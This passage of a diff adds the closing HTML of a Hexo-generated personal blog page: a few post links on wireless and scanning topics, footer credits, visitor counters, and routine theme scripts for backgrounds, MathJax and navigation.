href="/2017/08/30/无线渗透(上)--WPA加密/">无线渗透(上)--WPA加密</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/信息收集— 僵尸扫描/">信息收集— 僵尸扫描</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 TimeS0ng
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
